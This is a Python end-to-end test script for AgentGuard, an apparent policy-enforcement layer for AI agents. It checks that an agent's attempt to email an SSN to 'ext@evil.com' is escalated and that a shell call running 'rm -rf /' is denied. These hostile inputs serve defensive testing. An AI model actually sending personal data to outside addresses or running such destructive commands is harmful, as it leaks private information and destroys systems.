"""Remote client-side e2e — drives the Harness against an already-running PDP.

Unlike :mod:`agentguard.examples.dual_path_e2e` (which starts its own server),
this script targets an **external** AgentGuard server given by the
``AGENTGUARD_API_BASE`` env var. It is what the ``client`` container runs in the
Docker Compose e2e topology, validating a true cross-process / cross-container
PEP↔PDP flow.

Run locally against a running server::

    AGENTGUARD_API_BASE=http://localhost:38080 python -m agentguard.examples.remote_client_e2e
"""

from __future__ import annotations

import os
import sys
import time

from agentguard import AgentGuard
from agentguard.harness.tool_wrapper import ToolDenied
from agentguard.pdp_client.client import PDPUnavailable
from agentguard.schemas.events import EventType, RuntimeEvent


def _wait_for_server(base_url: str, api_key: str, attempts: int = 30) -> bool:
    from agentguard.pdp_client.client import PDPClient

    client = PDPClient(base_url, api_key=api_key, timeout=2.0)
    for _ in range(attempts):
        try:
            client.policy_version()
            return True
        except PDPUnavailable:
            time.sleep(1.0)
    return False


def main() -> int:
    base_url = os.getenv("AGENTGUARD_API_BASE", "http://localhost:38080")
    api_key = os.getenv("AGENTGUARD_API_KEY", "")

    print("=" * 70)
    print(f"AgentGuard remote client e2e → {base_url}")
    print("=" * 70)

    if not _wait_for_server(base_url, api_key):
        print(f"[error] server at {base_url} not reachable")
        return 2

    failures: list[str] = []

    def check(name: str, ok: bool, detail: str = "") -> None:
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}{(' — ' + detail) if detail else ''}")
        if not ok:
            failures.append(name)

    guard = AgentGuard(
        session_id="remote-e2e",
        agent_id="analyst",
        pdp_url=base_url,
        api_key=api_key,
        enforcer_mode="dual",
        escalate_risk_threshold=0.6,
        async_prewarm=False,
        sandbox_backend=os.getenv("AGENTGUARD_SANDBOX_BACKEND", "local"),
    )
    ctx = guard.context

    check("policy version synced", bool(guard._pdp.policy_version().get("etag")))  # type: ignore[union-attr]

    fast = guard._enforcer.enforce(
        RuntimeEvent(type=EventType.TOOL_CALL, session_id=ctx.session_id,
                     tool_name="read_report", args={"s": "x"}), ctx)
    check("fast_path local", fast.path == "fast", f"path={fast.path}")

    slow = guard._enforcer.enforce(
        RuntimeEvent(type=EventType.NETWORK_ACTION, session_id=ctx.session_id,
                     tool_name="send_email", capabilities=["network"], sink_type="email",
                     args={"to": "ext@evil.com", "body": "ssn 123-45-6789"}), ctx)
    check("slow_path to remote PDP", slow.path == "slow",
          f"path={slow.path}, action={slow.action.value}")

    @guard.wrap_tool(name="run_shell", sink_type="shell", capabilities=["shell", "exec"])
    def run_shell(command: str) -> str:
        return command

    denied = False
    try:
        guard.invoke_tool("run_shell", command="rm -rf /")
    except ToolDenied:
        denied = True
    check("destructive shell denied", denied)

    guard.close()
    print("-" * 70)
    if failures:
        print(f"RESULT: {len(failures)} FAILED: {failures}")
        return 1
    print("RESULT: all remote client e2e checks PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
